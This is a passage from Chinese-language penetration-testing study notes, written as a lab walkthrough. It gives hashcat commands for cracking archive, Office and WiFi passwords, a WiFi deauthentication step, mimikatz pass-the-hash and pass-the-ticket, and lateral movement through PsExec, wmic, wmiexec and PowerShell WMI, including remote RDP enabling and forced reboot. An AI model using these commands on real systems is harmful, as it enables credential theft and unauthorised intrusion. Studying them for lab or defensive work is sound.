class="language-none">hashcat -a 3 -m 2611 --force 14e1b600b1fd579f47433b88e8d85291: ?d?d?d?d?d?d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>其密码加密方式 md5(md5($pass).$salt)</p></blockquote><h3 id="RAR-压缩密码"><a href="#RAR-压缩密码" class="headerlink" title="RAR 压缩密码"></a>RAR 压缩密码</h3><p>首先获取 rar 文件的 hash 值，我们可以使用另一款哈希破解工具 John 提供的 rar2john 工具将 rar 文件里的 hash 提取出来。</p><p>rar2john 下载地址：<a href="http://openwall.info/wiki/_media/john/johntheripper-v1.8.0.12-jumbo-1-bleeding-e6214ceab-2018-02-07-win-x64.7z">http://openwall.info/wiki/_media/john/johntheripper-v1.8.0.12-jumbo-1-bleeding-e6214ceab-2018-02-07-win-x64.7z</a></p><pre class="line-numbers language-none"><code class="language-none"># 获取 rar 文件 hashrar2john.exe 1.rar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>hashcat 支持 RAR3-hp 和 RAR5</p><p>对于 RAR5，示例如下：</p><pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 -m 13000 --force &#39;$rar5$16$b06f5f2d4c973d6235e1a88b8d5dd594$15$a520dddcc53dd4e3930b8489b013f273$8$733969e5bda903e4&#39; ?d?d?d?d?d?d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>对于 RAR3-hp</p><pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 -m 12500 --force &#39;$RAR3$*0*5ba3dd697a8706fa*919ad1d7a1c42bae4a8d462c8537c9cb&#39; ?d?d?d?d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>RAR3-hp 哈希头为 $RAR3$*0*，而不是 $RAR3$*1*，中间的数值是0（-hp）而不是1（-p），-p 尚未得到支持，只支持 -hp</p><p>关于 RAR 参数 -p 和 -hp 的区别：<br>-p：只对 RAR 文件加密，里面的目录和文件名没加密；<br>-hp：对目录中的文件名和子目录都进行加密处理</p></blockquote><h3 id="ZIP-压缩密码"><a href="#ZIP-压缩密码" class="headerlink" title="ZIP 压缩密码"></a>ZIP 压缩密码</h3><p>和 rar 破解过程一样，我们需要先提取 zip 文件的哈希值，这里可以使用 zip2john 进行获取，zip2john.exe 在上面下载的 rar2john.exe 的同级目录下。</p><pre class="line-numbers language-none"><code class="language-none"># 获取 zip 文件 hashzip2john.exe 1.zip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 -m 13600 &#39;$zip2$*0*3*0*18b1a7e7ad39cb3624e54622849b23c7*5b99*3*5deee7*a418cee1a98710adce9a*$&#x2F;zip2$&#39; --force ?d?d?d?d?d?d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>这里 ZIP 的加密算法使用的 AES256</p></blockquote><h3 id="office-密码"><a href="#office-密码" class="headerlink" title="office 密码"></a>office 密码</h3><p>和 rar 与 zip 破解过程一样，我们需要先提取 office 文件的哈希值，这里可以使用 office2john.py 进行获取，office2john.py 在上面下载的 rar2john.exe 和 zip2john.exe 的同级目录下。</p><pre class="line-numbers language-none"><code class="language-none"># 获取 office 文件 hashpython office2john.py 1.docx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>测试中发现 python 会出现告警信息，不过这个告警信息不会影响程序执行</p></blockquote><pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 -m 9600 &#39;$office$*2013*100000*256*16*cd8856416b1e14305a0e8aa8eba6ce5c*18cada7070f1410f3a836c0dfc4b9643*befcde69afeafb3e652719533c824413b00ce4a499589e5ac5bd7a7a0d3c4f3d&#39; --force ?d?d?d?d?d?d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>这里哈希头为 2013 所以使用 9600 破解模式，如果是 2010 则要使用 9500 破解模式，2007 则使用 9400 破解模式。</p></blockquote><h3 id="WIFI-密码"><a href="#WIFI-密码" class="headerlink" title="WIFI 密码"></a>WIFI 密码</h3><p>要破解 WIFI 密码，首先要抓到 WIFI 的握手包，要想得到 WIFI 的握手包，就需要在监听时刚好有设备连接了该 WIFI，但这就需要运气加成，因此可以我们可以主动将该 WIFI 的设备踢下去，一般设备就会自动连接该 WIFI，此时我们就抓到握手包了。</p><p><strong>抓取 WIFI 握手包</strong></p><p>1、将网卡处于监听状态</p><pre class="line-numbers language-none"><code class="language-none">airmon-ng check airmon-ng check kill &#x2F;&#x2F; 关闭影响监听状态的进程airmon-ng start wlan0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>wlan0 是网卡名称，一般都是 wlan0，如果不是则需要根据自己的情况进行修改，可通过 iwconfig 进行查看网卡的名称</p></blockquote><p>当使用 iwconfig 查看网卡名称变为 wlan0mon 说明此时网卡已经处于监听模式了</p><p>2、扫描可用 WIFI</p><pre class="line-numbers language-none"><code class="language-none">airodump-ng wlan0mon<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210831104636.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>3、获取wifi的握手包</p><pre class="line-numbers language-none"><code class="language-none">airodump-ng -c (上一步扫描的 CH ) --bssid (想要破解 WIFI 的 bssid ) -w (握手文件存放目录) wlan0mon<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里以 ssid 为 teamssix 的 WIFI 为例</p><pre class="line-numbers language-none"><code class="language-none">airodump-ng -c 1 --bssid 5E:C1:1B:A2:37:F1 -w .&#x2F; wlan0mon<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>为了顺利得到 WIFI 的握手包，可以将该 WIFI 下的设备强制踢下去</p><pre class="line-numbers language-none"><code class="language-none">aireplay-ng -0 0 -a (要破解的 wifi 的 bssid ) -c (强制踢下的设备的 MAC 地址) wlan0mon<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210831105351.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>可以看到 teamssix 这个 WIFI 有一个设备正在连接，该设备的 MAC 地址为：38:26:2C:13:D3:33，使用以下命令可以将其强制踢下去</p><pre class="line-numbers language-none"><code class="language-none">aireplay-ng -0 0 -a 5E:C1:1B:A2:37:F1 -c 38:26:2C:13:D3:33 wlan0mon<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>等待设备重新连接后，当右上角出现 WPA handshake 的时候说明获取成功</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210831132010.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>4、破解密码</p><p>使用 aircrack-ng 将握手包转换成 hccapx 格式</p><pre class="line-numbers language-none"><code class="language-none">aircrack-ng 1.cap -j 1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 -m 2500 1.hccapx ?d?d?d?d?d?d?d?d --force<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者使用 hashcat 官网提供的在线工具进行格式转换：<a href="https://hashcat.net/cap2hashcat/">https://hashcat.net/cap2hashcat/</a></p><pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 -m 22000 1.hc22000 ?d?d?d?d?d?d?d?d --force<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210831113326.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h2 id="5、其他"><a href="#5、其他" class="headerlink" title="5、其他"></a>5、其他</h2><ul><li><p>Hashcat 在有时破解的时候会提示 All hashes found in potfile!，这表明该 hash 已经被破解出来过了，可以使用 hashcat [哈希值] –show 查看已破解出来的明文密码。</p></li><li><p>如果想再次破解已经破解过的密码，删除 ~/.hashcat/hashcat.potfile 文件里的对应记录即可。</p></li><li><p>在使用GPU模式进行破解时，可以使用 -O 参数自动进行优化</p></li><li><p>在实际破解过程中，可以先使用 top 字典进行破解，不行再试试社工字典，比如姓名+生日的组合字典</p></li><li><p>Hashcat 参数优化：</p></li></ul><pre class="line-numbers language-none"><code class="language-none">--gpu-accel 160可以让GPU发挥最大性能--gpu-loops 1024可以让GPU发挥最大性能--segment-size 512    可以提高大字典破解的速度<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h1 id="0x21-哈希传递与票据传递"><a href="#0x21-哈希传递与票据传递" class="headerlink" title="0x21 哈希传递与票据传递"></a>0x21 哈希传递与票据传递</h1><h2 id="1、哈希传递"><a href="#1、哈希传递" class="headerlink" title="1、哈希传递"></a>1、哈希传递</h2><p>哈希传递（Pass The Hash, PTH）顾名思义，就是利用哈希去登录内网中的其他机器，而不是通过明文密码登录的方式。</p><p>通过哈希传递，攻击者不需要花时间破解哈希值得到明文，在Windows Server 2012 R2及之后版本的操作系统中，默认不会在内存中保存明文密码，Mimikatz 就读不到密码明文，因此此时往往会使用工具将哈希值传递到其他计算机中进行登录验证。</p><h3 id="NTLM-Hash"><a href="#NTLM-Hash" class="headerlink" title="NTLM Hash"></a>NTLM Hash</h3><p>在目标主机上使用 mimikatz 获取 NTLM Hash</p><pre class="line-numbers language-none"><code class="language-none">privilege::debugsekurlsa::logonpasswords<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>在远程主机上以管理员权限打开 mimikatz</p><pre class="line-numbers language-none"><code class="language-none">privilege::debugsekurlsa::pth &#x2F;user:administrator &#x2F;domain:teamssix.com &#x2F;ntlm:161cff084477fe596a5db81874498a24<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210901120511.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>mimikatz 执行后，会弹出一个拥有对应 Hash 用户权限的 CMD 窗口。</p><h3 id="AES-256-密钥"><a href="#AES-256-密钥" class="headerlink" title="AES-256 密钥"></a>AES-256 密钥</h3><p>使用 mimikatz 抓取密钥</p><pre class="line-numbers language-none"><code class="language-none">privilege::debugsekurlsa::ekeys<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>在其他远程计算机中，以管理员权限打开 mimikatz</p><pre class="line-numbers language-none"><code class="language-none">privilege::debugsekurlsa::pth &#x2F;user:administrator &#x2F;domain:teamssix.com &#x2F;aes256:7358fb65149672d99b8c9f3dfd0dfeb486b78268e9c5250b23aefbd26f293c60<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这里需要目标机器上安装 KB2871997 补丁，补丁下载地址：<a href="https://www.microsoft.com/en-us/download/details.aspx?id=42722">https://www.microsoft.com/en-us/download/details.aspx?id=42722</a></p><p>将该补丁安装后，就可以通过 AES256 密钥进行哈希传递了。</p><p>除了 AES256 外还有 AES128 等，不过平时基本都是使用 NTLM 哈希进行传递。</p><h2 id="2、票据传递"><a href="#2、票据传递" class="headerlink" title="2、票据传递"></a>2、票据传递</h2><p>票据传递（Pass The Ticket, PTT）是基于Kerberos认证的一种攻击方式，这里主要学习票据传递在 mimikatz 和 kekeo 两个工具里的使用。</p><h3 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h3><p>使用 mimikatz 可以将内存中的票据进行导出。</p><pre class="line-numbers language-none"><code class="language-none">privilege::debugsekurlsa::tickets &#x2F;export<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>执行该命令后，会在当前目录下生成多个服务的票据文件，例如 kirbi 等</p><p>使用以下命令可以清除内存中的票据</p><pre class="line-numbers language-none"><code class="language-none">kerberos::purge<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将票据文件注入内存</p><pre class="line-numbers language-none"><code class="language-none">kerberos::ptt &quot;[0;4beae]-2-0-40e00000-Administrator@krbtgt-TEAMSSIX.COM.kirbi&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在当前终端下退出 mimikatz ，然后就可以列出目标目录了。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210901153402.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>票据传递除了用 mimikatz 还可以用 kekeo</p><h3 id="kekeo"><a href="#kekeo" class="headerlink" title="kekeo"></a>kekeo</h3><p>kekeo 需要使用域名、用户名、NTLM HASH 生成票据，然后再将票据导入，从而连接远程计算机。</p><pre class="line-numbers language-none"><code class="language-none">tgt::ask &#x2F;user:administrator &#x2F;domain:teamssix.com &#x2F;ntlm:161cff084477fe596a5db81874498a24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210901154851.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>在 kekeo 中清除当前内存中的其他票据，不然可能会导致票据传递失败</p><pre class="line-numbers language-none"><code class="language-none">kerberos::purge<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在 Windows 命令行中也可以执行系统自带的命令进行内存中的票据清除</p><pre class="line-numbers language-none"><code class="language-none">klist purge<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用以下命令将票据导入内存，之后 exit 退出 kekeo，使用 dir 命令就可以列出远程文件了。</p><pre class="line-numbers language-none"><code class="language-none">kerberos::ptt &quot;TGT_administrator@TEAMSSIX.COM_krbtgt~teamssix.com@TEAMSSIX.COM.kirbi&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210901155501.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>注意点：</p><p>1、票据文件注入内存的默认有效时间为 10 小时</p><p>2、在目标机器上不需要本地管理员权限就可以进行票据传递</p><p>3、使用票据传递时，dir 命令必须使用主机名，如果使用 IP 地址会提示拒绝访问。</p><h1 id="0x22-PsExec-和-WMI-的使用"><a href="#0x22-PsExec-和-WMI-的使用" class="headerlink" title="0x22 PsExec 和 WMI 的使用"></a>0x22 PsExec 和 WMI 的使用</h1><h2 id="1、PsExec"><a href="#1、PsExec" class="headerlink" title="1、PsExec"></a>1、PsExec</h2><h3 id="PsExec-exe"><a href="#PsExec-exe" class="headerlink" title="PsExec.exe"></a>PsExec.exe</h3><p>PsExec 在之前的文章里提到过一次，参见<a href="https://teamssix.com/210802-181052.html">https://teamssix.com/210802-181052.html</a>，今天来着重学习一下。</p><p>PsExec 是 PSTools 工具包里的一部分，其下载地址为：<a href="https://download.sysinternals.com/files/PSTools.zip">https://download.sysinternals.com/files/PSTools.zip</a></p><p>利用 PsExec 可以在远程计算机上执行命令，其基本原理是通过管道在远程目标主机上创建一个 psexec 服务，并在本地磁盘中生成一个名为 PSEXESVC 的二进制文件，然后通过 psexec 服务运行命令，运行结束后删除服务。</p><p>建立 ipc$ 连接</p><pre class="line-numbers language-none"><code class="language-none">net use \\192.168.7.7\ipc$ &quot;1qaz@WSX&quot; &#x2F;user:administrator或者net use \\192.168.7.7 &#x2F;u:teamssix.com\administrator &quot;1qaz@WSX&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在已经建立 ipc$ 的情况下，执行以下命令就可以获得 system 权限</p><pre class="line-numbers language-none"><code class="language-none">PsExec.exe -accepteula \\192.168.7.7 -s cmd.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">-accepteula 第一次运行 PsExec 会弹出确认框，使用该参数就不会弹出确认框-s 以 System 权限运行远程进程，如果不用这个参数，就会获得一个对应用户权限的 shell<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210902092309.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>如果没有建立 ipc$ 连接，也可以直接使用 PsExec 指定用户名密码进行连接</p><pre class="line-numbers language-none"><code class="language-none">PsExec.exe \\192.168.7.7 -u administrator -p 1qaz@WSX cmd.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">-u 域\用户名-p 密码<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者执行以下命令直接回显命令结果</p><pre class="line-numbers language-none"><code class="language-none">PsExec.exe \\192.168.7.7 -u administrator -p 1qaz@WSX cmd.exe &#x2F;c &quot;ipconfig&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在使用 PsExec 时需要注意以下几点：</p><ul><li>需要远程系统开启 admin$ 共享（默认是开启的）</li><li>因为 PsExec 连接的原理是基于 IPC 共享，因此目标需要开放 445 端口</li><li>在使用 IPC$ 连接目标系统后，不需要输入账户和密码。</li><li>在使用 PsExec 执行远程命令时，会在目标系统中创建一个 psexec 的服务，命令执行完后，psexec 服务将被自动删除。由于创建或删除服务时会产生大量的日志，因此蓝队在溯源时可以通过日志反推攻击流程。</li><li>使用 PsExec 可以直接获得 System 权限的交互式 Shell 的前提目标是 administrator 权限的 shell</li><li>在域环境测试时发现，非域用户无法利用内存中的票据使用 PsExec 功能，只能依靠账号和密码进行传递。</li></ul><h3 id="MSF-1"><a href="#MSF-1" class="headerlink" title="MSF"></a>MSF</h3><p>MSF 中也有 PsExec 的利用模块，使用方法如下：</p><pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;windows&#x2F;smb&#x2F;psexecset rhost 192.168.7.7set smbuser administratorset smbpass 1qaz@WSXrun<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2、WMI"><a href="#2、WMI" class="headerlink" title="2、WMI"></a>2、WMI</h2><p>WMI 全称 Windows Management Instrumentation 即 Windows 管理工具，Windows 98 以后的操作系统都支持 WMI。</p><p>由于 Windows 默认不会将 WMI 的操作记录在日志里，同时现在越来越多的杀软将 PsExec 加入了黑名单，因此 WMI 比 PsExec 隐蔽性要更好一些。</p><h3 id="wmic-命令"><a href="#wmic-命令" class="headerlink" title="wmic 命令"></a>wmic 命令</h3><p>WMI 连接远程主机，并使用目标系统的 cmd.exe 执行命令，将执行结果保存在目标主机 C 盘的 ip.txt 文件中</p><blockquote><p>使用 WMIC 连接远程主机，需要目标主机开放 135 和 445 端口( 135 端⼝是 WMIC 默认的管理端⼝，wimcexec 使⽤445端⼝传回显)</p></blockquote><pre class="line-numbers language-none"><code class="language-none">wmic &#x2F;node:192.168.7.7 &#x2F;user:administrator &#x2F;password:1qaz@WSX process call create &quot;cmd.exe &#x2F;c ipconfig &gt; c:\ip.txt&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>之后建立 IPC$ ，使用 type 读取执行结果</p><pre class="line-numbers language-none"><code class="language-none">net use \\192.168.7.7\ipc$ &quot;1qaz@WSX&quot; &#x2F;user:administratortype \\192.168.7.7\C$\ip.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210902112523.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>也可以预先建立 ipc$ 连接，再使用 wmic</p><pre class="line-numbers language-none"><code class="language-none">net use \\192.168.7.7\ipc$ &quot;1qaz@WSX&quot; &#x2F;user:administratorwmic &#x2F;node:192.168.7.7 process call create &quot;cmd.exe &#x2F;c ipconfig &gt;c:\ip.txt&quot;type \\192.168.7.7\C$\ip.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="wmiexec-py"><a href="#wmiexec-py" class="headerlink" title="wmiexec.py"></a>wmiexec.py</h3><p>在 impacket 工具包里有 wmiexec.py 脚本，可以用来直接获取 shell</p><pre class="line-numbers language-none"><code class="language-none">python3 wmiexec.py administrator:1qaz@WSX@192.168.7.7<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210902113920.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>wmiexec.py 还支持通过哈希传递获得 shell</p><pre class="line-numbers language-none"><code class="language-none">python3 wmiexec.py -hashes LMHash:NTHash 域名&#x2F;用户名@目标IP<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="wmiexec-vbs"><a href="#wmiexec-vbs" class="headerlink" title="wmiexec.vbs"></a>wmiexec.vbs</h3><p>wmiexec.vbs 脚本通过 VBS 调用 WMI 来模拟 PsExec 的功能，wmiexec.vbs 下载地址：<a href="https://github.com/k8gege/K8tools/blob/master/wmiexec.vbs">https://github.com/k8gege/K8tools/blob/master/wmiexec.vbs</a></p><pre class="line-numbers language-none"><code class="language-none">cscript &#x2F;&#x2F;nologo wmiexec.vbs &#x2F;shell 192.168.7.7 administrator 1qaz@WSX<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210902122716.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>使用 vmiexec.vbs 执行单条命令</p><pre class="line-numbers language-none"><code class="language-none">cscript wmiexec.vbs &#x2F;cmd 192.168.7.7 administrator 1qaz@WSX &quot;ipconfig&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>因为这只是个半交互式的 Shell，因此对于运行时间比较长的命令，比如 ping、systeminfo 等，需要加上 -wait 5000 或更长的时间。</p><p>在运行 nc 等不需要输出结果但需要一直运行的进程时，可以使用 -persist 参数，当命令加了 -persist 选项后，程序会在后台运行，不会有结果输出，而且会返回这个命令进程的 PID，方便结束进程，这样就可以运行 nc 或者木马程序了。</p><p>不过目前 vmiexec.vbs 已经被卡巴斯基、赛门铁克等杀软列入查杀名单了。</p><h3 id="Invoke-WmiCommand"><a href="#Invoke-WmiCommand" class="headerlink" title="Invoke-WmiCommand"></a>Invoke-WmiCommand</h3><p>Invoke-WmiCommand.ps1 是 PowerSploit 工具包里的一部分，该脚本是利用 Powershell 调用 WMI 来远程执行命令。</p><p>在 Powershell 中运行以下命令</p><pre class="line-numbers language-none"><code class="language-none"># 导入 Invoke-WmiCommand.ps1 脚本Import-Module .\Invoke-WmiCommand.ps1# 指定目标系统用户名$User &#x3D; &quot;teamssix.com\administrator&quot; # 指定目标系统的密码$Password &#x3D; ConvertTo-SecureString -String &quot;1qaz@WSX&quot; -AsPlainText -Force# 将账号和密码整合起来，以便导入 Credential$Cred &#x3D; New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $User,$Password# 指定要执行的命令和目标 IP$Remote &#x3D; Invoke-WmiCommand -Payload &#123;ipconfig&#125; -Credential $Cred -ComputerName 192.168.7.7# 将执行结果输出到屏幕上$Remote.PayloadOutput<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210902130614.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h3 id="Invoke-WMIMethod"><a href="#Invoke-WMIMethod" class="headerlink" title="Invoke-WMIMethod"></a>Invoke-WMIMethod</h3><p>Invoke-WMIMethod 是 PowerShell 自带的一个模块，也可以用它来连接远程计算机执行命令和指定程序。</p><pre class="line-numbers language-none"><code class="language-none"># 指定目标系统用户名$User&#x3D;&quot;teamssix.com\administrator&quot;# 指定目标系统密码$Password&#x3D;ConvertTo-SecureString -String &quot;1qaz@WSX&quot; -AsPlainText -Force# 将账号和密码整合起来，以便导入 Credential中$Cred&#x3D;New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $User,$Password# 在远程系统中运行 calc.exe 命令Invoke-WMIMethod -Class Win32_Process -Name Create -ArgumentList &quot;calc.exe&quot; -ComputerName &quot;192.168.7.7&quot; -Credential $Cred<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210902131658.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>可以看到在 192.168.7.7 主机中已经有进程 ID 为 3276 的 calc.exe 被执行了。</p><h3 id="wmic-的其他命令"><a href="#wmic-的其他命令" class="headerlink" title="wmic 的其他命令"></a>wmic 的其他命令</h3><p>使用 wmic 远程开启目标的 RDP</p><pre class="line-numbers language-none"><code class="language-none"># 适于 Windows xp、server 2003wmic &#x2F;node:192.168.7.7 &#x2F;user:administrator &#x2F;password:1qaz@WSX PATH win32_terminalservicesetting WHERE (__Class!&#x3D;&quot;&quot;) CALL SetAllowTSConnections 1# 适于 Windows 7、8、10，server 2008、2012、2016，注意 ServerName 需要改为目标的 hostnamewmic &#x2F;node:192.168.7.7 &#x2F;user:administrator &#x2F;password:1qaz@WSX RDTOGGLE WHERE ServerName&#x3D;&#39;dc&#39; call SetAllowTSConnections 1或者wmic &#x2F;node:192.168.7.7 &#x2F;user:administrator &#x2F;password:1qaz@WSX process call create &#39;cmd.exe &#x2F;c REG ADD &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 0 &#x2F;f&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>判断 RDP 有没有开可以使用以下命令，如果返回 0 表示开启，返回 1 表示关闭。</p><pre class="line-numbers language-none"><code class="language-none">REG QUERY &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; &#x2F;v fDenyTSConnections<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> <img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210902135523.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>使用 wmic 远程重启目标计算机</p><pre class="line-numbers language-none"><code class="language-none">wmic &#x2F;node:192.168.7.7 &#x2F;user:administrator &#x2F;password:1qaz@WSX process call create &quot;shutdown.exe -r -f -t 0&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="0x23-SMBExec-与-DCOM-的使用"><a href="#0x23-SMBExec-与-DCOM-的使用" class="headerlink" title="0x23 SMBExec 与 DCOM 的使用"></a>0x23 SMBExec 与 DCOM 的使用</h1><h2 id="1、SMBExec"><a href="#1、SMBExec" class="headerlink" title="1、SMBExec"></a>1、SMBExec</h2><p>利用 SMBExec 可以通过文件共享（admin$、c$、ipc$、d$）在远程系统中执行命令，它的工作方式类似于 PsExec</p><h3 id="C-版"><a href="#C-版" class="headerlink" title="C++ 版"></a>C++ 版</h3><p>C++ 版项目地址：<a 